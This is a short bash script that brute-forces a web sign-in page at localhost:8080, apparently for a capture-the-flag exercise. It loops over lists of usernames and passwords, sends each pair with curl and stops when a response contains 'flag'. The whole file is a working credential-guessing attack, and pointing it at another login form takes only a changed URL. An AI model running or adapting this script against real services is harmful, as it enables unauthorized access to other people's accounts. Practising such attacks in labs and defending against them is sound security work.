#!/bin/bash

TARGET="http://localhost:8080/?page=signin"

while read username; do
  while read password; do
    response=$(curl -s "$TARGET&username=$username&password=$password&Login=Login")
    if echo "$response" | grep -q "flag"; then
      echo "[+] FOUND! username=$username password=$password"
      exit 0
    else
      echo "[-] Trying $username:$password"
    fi
  done < passwords.txt
done < users.txt

echo "[!] No credentials found"
